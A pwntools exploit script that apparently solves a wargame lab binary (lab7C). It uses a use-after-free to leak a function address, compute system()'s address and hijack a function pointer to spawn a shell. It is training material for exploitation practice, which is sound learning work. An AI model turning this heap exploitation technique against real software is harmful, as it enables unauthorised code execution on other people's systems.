from pwn import *
# base_addr - 0x19CE70 = system_addr

p = process("/levels/lab07/lab7C")

p.recvuntil("Choice: ")
p.sendline("2") # Create number 

p.recvuntil("store: ")
p.sendline("1337")

p.recvuntil("Choice: ")
p.sendline("4") # Delete number

p.recvuntil("Choice: ")
p.sendline("1") # Create string
#p.sendline("")
#p.recvuntil("store: ")
# We don't do recvuntil because it gets stuck, no idea why but
# I solved it doing an empty sendline but then it fucked our "/bin/sh"
p.sendline("/bin/sh") # char buffer[20] = "/bin/sh\x00"

p.recvuntil("Choice: ")
p.sendline("6") # print_num, prints addr of small_str() since
                # we free'd number and string took it's place in the heap

p.recvuntil("print: ")
p.sendline("1") # Select index

p.recvuntil("enough: ")

# Calculate system address from small_str address
small_str_addr = int(p.recvline())
base_addr = small_str_addr - 0xbc7
system_addr = base_addr - 0x19ce70
log.info("small_str addr: {}".format(hex(small_str_addr)))
log.info("base addr: {}".format(hex(base_addr)))
log.info("system addr: {}".format(hex(system_addr)))

# The structs look like this in memory right now:
#struct data { <-- program thinks object is struct data
#    char reserved[8]; --> always empty
#    char buffer[20]; --> "/bin/sh"+"\x00"*9 + small_num()
#    void (* print)(char *); --> small_str()
#};
#
#struct number {
#    unsigned int reserved[6]; --> "\x00"*8+"/bin/sh"+"\x00"*9
#    void (* print)(unsigned int); --> small_num()
#    unsigned int num; --> small_str()
#};

p.recvuntil("Choice: ")
p.sendline("3") # Delete string

p.recvuntil("Choice: ")
p.sendline("2") # Make number

p.recvuntil("store: ")
p.sendline(str(system_addr)) 
print(str(system_addr))

p.recvuntil("Choice: ")
p.sendline("5")

p.recvuntil("print: ")
p.sendline("1")

p.interactive()